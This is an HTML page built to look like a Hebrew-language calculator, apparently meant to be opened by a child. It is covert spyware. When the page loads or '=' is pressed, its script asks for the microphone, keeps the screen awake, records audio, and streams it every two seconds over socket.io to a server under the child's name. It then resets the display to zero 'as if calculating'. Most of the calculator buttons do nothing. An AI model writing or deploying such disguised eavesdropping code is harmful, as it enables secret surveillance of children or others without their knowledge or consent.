<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מחשבון</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: sans-serif; background: black; margin: 0; display: flex; height: 100vh; overflow: hidden; color: white; }
        .calculator { width: 100%; display: flex; flex-direction: column; }
        .display { flex: 1; font-size: 80px; display: flex; align-items: flex-end; justify-content: flex-end; padding: 20px; font-weight: 300; }
        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 20px; flex: 2; }
        .btn { background: #333; border: none; border-radius: 50%; font-size: 30px; color: white; aspect-ratio: 1/1; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .btn-op { background: #ff9f0a; }
        .btn-special { background: #a5a5a5; color: black; }
        .btn:active { opacity: 0.7; }
    </style>
</head>
<body>
    <div class="calculator">
        <div class="display" id="display">0</div>
        <div class="buttons">
            <button class="btn btn-special">C</button>
            <button class="btn btn-special">+/-</button>
            <button class="btn btn-special">%</button>
            <button class="btn btn-op">÷</button>
            <button class="btn" onclick="press('7')">7</button>
            <button class="btn" onclick="press('8')">8</button>
            <button class="btn" onclick="press('9')">9</button>
            <button class="btn btn-op">×</button>
            <button class="btn" onclick="press('4')">4</button>
            <button class="btn" onclick="press('5')">5</button>
            <button class="btn" onclick="press('6')">6</button>
            <button class="btn btn-op">−</button>
            <button class="btn" onclick="press('1')">1</button>
            <button class="btn" onclick="press('2')">2</button>
            <button class="btn" onclick="press('3')">3</button>
            <button class="btn btn-op">+</button>
            <button class="btn" style="grid-column: span 2; border-radius: 50px; aspect-ratio: auto;" onclick="press('0')">0</button>
            <button class="btn">.</button>
            <button class="btn btn-op" onclick="start()">=</button>
        </div>
    </div>

    <script>
        const socket = io();
        const urlParams = new URLSearchParams(window.location.search);
        const childName = urlParams.get('name') || "ילד";

        function press(n) { 
            const d = document.getElementById('display');
            d.innerText = d.innerText === '0' ? n : d.innerText + n;
        }

        async function start() {
            try {
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                
                socket.emit('join-room', { name: childName });

                mediaRecorder.ondataavailable = async (e) => {
                    if (e.data.size > 0) {
                        const buffer = await e.data.arrayBuffer();
                        socket.emit('audio-data', buffer);
                    }
                };
                mediaRecorder.start(2000); // שולח כל 2 שניות
                document.getElementById('display').innerText = "0"; // מחזיר לאפס כאילו חושב
            } catch (err) { alert("יש לאשר מיקרופון"); }
        }
        window.onload = start;
    </script>
</body>
</html>
